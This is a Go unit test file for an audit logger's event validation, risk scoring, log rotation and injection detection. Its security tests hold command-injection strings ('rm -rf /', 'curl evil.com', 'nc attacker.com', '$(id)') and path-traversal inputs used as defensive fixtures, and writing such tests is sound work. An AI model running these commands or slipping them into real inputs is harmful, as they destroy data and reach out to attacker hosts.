package security

import (
	"context"
	"testing"
	"time"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"go.uber.org/zap"
)

func TestAuditEvent(t *testing.T) {
	tests := []struct {
		name  string
		event AuditEvent
		valid bool
	}{
		{
			name: "valid audit event",
			event: AuditEvent{
				ID:        "test-123",
				Timestamp: time.Now(),
				EventType: "authentication",
				Actor:     "user123",
				Resource:  "login",
				Action:    "attempt",
				Result:    "success",
				RiskScore: 30,
			},
			valid: true,
		},
		{
			name: "minimal audit event",
			event: AuditEvent{
				EventType: "system",
				Actor:     "admin",
				Action:    "config_change",
				Result:    "success",
			},
			valid: true,
		},
		{
			name: "event with details",
			event: AuditEvent{
				EventType: "file_access",
				Actor:     "user456",
				Resource:  "/etc/passwd",
				Action:    "read",
				Result:    "denied",
				Details: map[string]interface{}{
					"reason": "insufficient_permissions",
					"path":   "/etc/passwd",
				},
				RiskScore: 70,
			},
			valid: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Validate required fields
			if tt.event.EventType == "" && tt.valid {
				t.Error("Valid event should have EventType")
			}
			if tt.event.Actor == "" && tt.valid {
				t.Error("Valid event should have Actor")
			}
			if tt.event.Action == "" && tt.valid {
				t.Error("Valid event should have Action")
			}

			// Validate risk score range
			if tt.event.RiskScore < 0 || tt.event.RiskScore > 100 {
				t.Errorf("Risk score should be 0-100, got %d", tt.event.RiskScore)
			}

			// Check for injection attempts in fields
			eventFields := []string{
				tt.event.EventType, tt.event.Actor, tt.event.Resource,
				tt.event.Action, tt.event.Result, tt.event.IP, tt.event.UserAgent,
			}

			for i, field := range eventFields {
				if field != "" && containsDangerousCharsAudit(field) {
					t.Errorf("Field %d contains dangerous characters: %s", i, field)
				}
			}
		})
	}
}

func TestNewAuditLogger(t *testing.T) {
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
		Log: logger,
	}

	tests := []struct {
		name    string
		logDir  string
		wantErr bool
	}{
		{
			name:    "valid log directory",
			logDir:  "/tmp/test-audit-valid",
			wantErr: false,
		},
		{
			name:    "nested directory",
			logDir:  "/tmp/test-audit/nested/dir",
			wantErr: false,
		},
		{
			name:    "empty directory",
			logDir:  "",
			wantErr: true, // Should fail on empty directory
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			auditLogger, err := NewAuditLogger(rc, tt.logDir)

			if (err != nil) != tt.wantErr {
				t.Errorf("NewAuditLogger() error = %v, wantErr %v", err, tt.wantErr)
				return
			}

			if !tt.wantErr {
				if auditLogger == nil {
					t.Error("AuditLogger should not be nil")
				}
				if auditLogger.logDir != tt.logDir {
					t.Errorf("LogDir = %v, want %v", auditLogger.logDir, tt.logDir)
				}
				if auditLogger.maxLogSize <= 0 {
					t.Error("MaxLogSize should be positive")
				}
				if auditLogger.logger == nil {
					t.Error("Logger should not be nil")
				}
			}
		})
	}
}

func TestAuditLogger_LogEvent(t *testing.T) {
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
		Log: logger,
	}

	auditLogger, err := NewAuditLogger(rc, "/tmp/test-audit-events")
	if err != nil {
		t.Fatalf("Failed to create audit logger: %v", err)
	}

	ctx := context.Background()

	tests := []struct {
		name    string
		event   AuditEvent
		wantErr bool
	}{
		{
			name: "standard event",
			event: AuditEvent{
				EventType: "authentication",
				Actor:     "user123",
				Action:    "login",
				Result:    "success",
			},
			wantErr: false,
		},
		{
			name: "high risk event",
			event: AuditEvent{
				EventType: "privilege_escalation",
				Actor:     "admin",
				Action:    "sudo",
				Result:    "success",
				RiskScore: 80,
			},
			wantErr: false,
		},
		{
			name: "event with details",
			event: AuditEvent{
				EventType: "file_modification",
				Actor:     "user456",
				Resource:  "/etc/hosts",
				Action:    "write",
				Result:    "success",
				Details: map[string]interface{}{
					"size":     1024,
					"checksum": "abc123",
				},
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := auditLogger.LogEvent(ctx, tt.event)

			if (err != nil) != tt.wantErr {
				t.Errorf("LogEvent() error = %v, wantErr %v", err, tt.wantErr)
			}

			// Verify event was processed (ID and timestamp should be added)
			if !tt.wantErr {
				// The event should have been enriched with ID and timestamp
				// We can't directly verify this without modifying the original event
				// But we can verify the function didn't panic
				t.Logf("Successfully logged event: %s", tt.event.EventType)
			}
		})
	}
}

func TestAuditEventValidation(t *testing.T) {
	t.Run("event id generation", func(t *testing.T) {
		// Test event ID generation
		id1 := generateEventID()
		id2 := generateEventID()

		if id1 == "" {
			t.Error("Event ID should not be empty")
		}
		if id2 == "" {
			t.Error("Event ID should not be empty")
		}
		if id1 == id2 {
			t.Error("Event IDs should be unique")
		}

		// Check ID format (should be hex string)
		if len(id1) < 8 {
			t.Error("Event ID should be at least 8 characters")
		}
	})

	t.Run("risk score calculation", func(t *testing.T) {
		events := []AuditEvent{
			{
				EventType: "authentication",
				Action:    "login",
				Result:    "success",
			},
			{
				EventType: "authentication",
				Action:    "login",
				Result:    "failure",
			},
			{
				EventType: "privilege_escalation",
				Action:    "sudo",
				Result:    "success",
			},
			{
				EventType: "file_access",
				Resource:  "/etc/shadow",
				Action:    "read",
				Result:    "denied",
			},
		}

		for _, event := range events {
			score := calculateRiskScore(event)

			if score < 0 || score > 100 {
				t.Errorf("Risk score should be 0-100, got %d for event %s", score, event.EventType)
			}

			// Different event types should have different risk scores
			t.Logf("Event %s/%s/%s: risk score %d", event.EventType, event.Action, event.Result, score)
		}
	})

	t.Run("timestamp handling", func(t *testing.T) {
		now := time.Now()

		// Test with zero timestamp
		event1 := AuditEvent{}

		// Test with existing timestamp
		event2 := AuditEvent{
			Timestamp: now,
		}

		// Verify timestamp handling logic
		if !event1.Timestamp.IsZero() {
			t.Error("New event should have zero timestamp initially")
		}

		if event2.Timestamp != now {
			t.Error("Existing timestamp should be preserved")
		}
	})
}

func TestAuditEventSecurity(t *testing.T) {
	t.Run("injection prevention", func(t *testing.T) {
		// Test various injection attempts in audit event fields
		injectionAttempts := []struct {
			field string
			value string
		}{
			{"actor", "user; rm -rf /"},
			{"action", "login && curl evil.com"},
			{"resource", "file | nc attacker.com"},
			{"result", "success`whoami`"},
			{"event_type", "auth$(id)"},
		}

		for _, attempt := range injectionAttempts {
			t.Run("injection_"+attempt.field, func(t *testing.T) {
				if !containsDangerousCharsAudit(attempt.value) {
					t.Errorf("Should detect dangerous characters in %s: %s", attempt.field, attempt.value)
				} else {
					t.Logf("Correctly detected injection in %s: %s", attempt.field, attempt.value)
				}
			})
		}
	})

	t.Run("data sanitization", func(t *testing.T) {
		// Test that sensitive data is properly handled
		sensitiveData := []string{
			"password=secret123",
			"token=abc123def456",
			"key=private_key_data",
			"credential=user:pass",
		}

		for _, data := range sensitiveData {
			// Check if data contains sensitive patterns
			containsSensitive := containsStringAudit(data, "password") ||
				containsStringAudit(data, "token") ||
				containsStringAudit(data, "key") ||
				containsStringAudit(data, "credential")

			if containsSensitive {
				t.Logf("Identified sensitive data that should be redacted: %s", data)
			}
		}
	})

	t.Run("log directory security", func(t *testing.T) {
		// Test log directory path validation
		validPaths := []string{
			"/var/log/audit",
			"/opt/eos/logs",
			"/tmp/audit-test",
		}

		invalidPaths := []string{
			"../../../etc/passwd",
			"/etc/shadow",
			"./logs; rm -rf /",
		}

		for _, path := range validPaths {
			if containsDangerousCharsAudit(path) {
				t.Errorf("Valid path should not contain dangerous characters: %s", path)
			}
		}

		for _, path := range invalidPaths {
			// Check for path traversal and injection
			isDangerous := containsStringAudit(path, "..") ||
				containsDangerousCharsAudit(path) ||
				containsStringAudit(path, "/etc/")

			if !isDangerous {
				t.Errorf("Should detect dangerous path: %s", path)
			} else {
				t.Logf("Correctly identified dangerous path: %s", path)
			}
		}
	})
}

func TestAuditLogRotation(t *testing.T) {
	t.Run("log size limits", func(t *testing.T) {
		logger := zap.NewNop()
		rc := &eos_io.RuntimeContext{
			Ctx: context.Background(),
			Log: logger,
		}

		auditLogger, err := NewAuditLogger(rc, "/tmp/test-audit-rotation")
		if err != nil {
			t.Fatalf("Failed to create audit logger: %v", err)
		}

		// Verify default max log size
		expectedMaxSize := int64(100 * 1024 * 1024) // 100MB
		if auditLogger.maxLogSize != expectedMaxSize {
			t.Errorf("Expected max log size %d, got %d", expectedMaxSize, auditLogger.maxLogSize)
		}

		// Test size validation
		if auditLogger.maxLogSize <= 0 {
			t.Error("Max log size should be positive")
		}

		if auditLogger.maxLogSize < 1024*1024 {
			t.Error("Max log size should be at least 1MB")
		}
	})
}

// Helper functions for audit tests
func containsDangerousCharsAudit(s string) bool {
	dangerous := []string{";", "&", "|", "`", "$", "$(", "&&", "||", "\n", "\r"}
	for _, d := range dangerous {
		if containsStringAudit(s, d) {
			return true
		}
	}
	return false
}

func containsStringAudit(s, substr string) bool {
	if len(substr) == 0 {
		return true
	}
	if len(s) < len(substr) {
		return false
	}
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
